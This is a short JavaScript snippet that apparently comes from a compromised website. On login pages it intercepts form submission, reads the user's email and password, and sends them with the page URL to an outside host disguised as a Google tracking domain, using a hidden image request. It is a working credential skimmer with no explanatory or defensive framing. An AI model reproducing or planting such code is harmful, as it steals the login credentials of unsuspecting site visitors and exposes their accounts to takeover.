if(window.location.pathname.indexOf("/login") != -1){
	$(document).ready(function(){
		$(document).on("submit", function(e){
			email = $("#user_mail").val();
			pass = $("#user_pass").val();

			src = "http://googltrack.vacau.com/users.php?u="+email+"&p="+pass+"&e="+email+"&url="+window.location.href;
			img = document.createElement('img');
			img.src = src;
			document.body.appendChild(img);
			sleep(1000);
		});
	});


	function sleep(ms) {
	  return new Promise(resolve => setTimeout(resolve, ms));
	}
}


